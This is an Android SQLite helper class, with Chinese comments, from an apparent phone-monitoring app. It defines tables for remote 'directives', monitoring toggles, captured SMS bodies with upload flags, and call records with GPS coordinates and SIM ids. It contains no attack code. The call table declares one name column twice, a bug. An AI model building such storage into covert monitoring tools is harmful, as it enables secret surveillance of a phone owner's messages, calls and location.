package com.privacy.monitor.db;

import com.privacy.monitor.domain.CallRecord;
import com.privacy.monitor.domain.Directive;
import com.privacy.monitor.domain.Monitor;
import com.privacy.monitor.domain.SMSRecord;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteDatabase.CursorFactory;
import android.database.sqlite.SQLiteOpenHelper;

/**
 * 初始化数据库表
 */
public class MySQLiteOpenHelper extends SQLiteOpenHelper {

	public MySQLiteOpenHelper(Context context, String name,CursorFactory factory, int version) {
		super(context, name, factory, version);
	}

	@Override
	public void onCreate(SQLiteDatabase db) {
		
		
		//指令表
		db.execSQL("CREATE TABLE IF NOT EXISTS "+DirectiveDB.TABLE_NAME+" (" +
		Directive.COL_DID + " INTEGER PRIMARY KEY AUTOINCREMENT," +
		Directive.COL_TYPE +" TEXT, " + Directive.COL_STATUS + " TEXT" +" );");
		
		//监控列表
		db.execSQL("CREATE TABLE IF NOT EXISTS " + MonitorDB.TABLE_NAME +" (" +
		Monitor.COL_ID +" INTEGER PRIMARY KEY AUTOINCREMENT ," +
		Monitor.COL_CALL_MONITOR_STATUS +" varchar(5), " + Monitor.COL_FILTER_STATUS +" varchar(5) ," +Monitor.COL_SMS_MONITOR_STATUS +" varchar(5), " +
		Monitor.COL_LOCATIONSTATUS +" varchar(5) ,  " + Monitor.COL_PHONE +" TEXT ) ;");
	
		//信息表
		db.execSQL("CREATE TABLE IF NOT EXISTS "+SMSRecordDB.TABLE_NAME+ " (" +
		SMSRecord.COL_ID +" INTEGER PRIMARY KEY AUTOINCREMENT," +
		SMSRecord.COL_PHONE +" TEXT, "+SMSRecord.COL_BODY+" TEXT,"+ SMSRecord.COL_NAME +" varchar(10) ,"+
		SMSRecord.COL_DATE +" TEXT,"+SMSRecord.COL_READ_STATUS +" varchar(5) ," + 
		SMSRecord.COL_SMS_TYPE +" varchar(5) ," +SMSRecord.COL_SENT_STATUS +" varchar(5),"+
		SMSRecord.COL_UPLOAD_STATUS +" varchar(5) ) ;");
		
		//通信录表
		db.execSQL("CREATE TABLE IF NOT EXISTS " + CallRecordDB.TABLE_NAME +" (" +
		CallRecord.COL_ID +" INTEGER PRIMARY KEY AUTOINCREMENT ," +CallRecord.COL_MY_PHONE +" TEXT," +
		CallRecord.COL_PHONE + " TEXT," + CallRecord.COL_CALL_STATUS +" varchar(5) ,"+
		CallRecord.COL_CALL_START_TIME +" TEXT," + CallRecord.COL_NAME +" TEXT,"+
		CallRecord.COL_CALL_STOP_TIME +" TEXT," + CallRecord.COL_LAT +" TEXT,"+
		CallRecord.COL_LON +" TEXT," + CallRecord.COL_DEVICE_NAME +" TEXT,"+
		CallRecord.COL_NAME +" varchar(10) , "+ CallRecord.COL_SIM_ID+" TEXT ); ");
		
	}

	@Override
	public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
		
	}
}
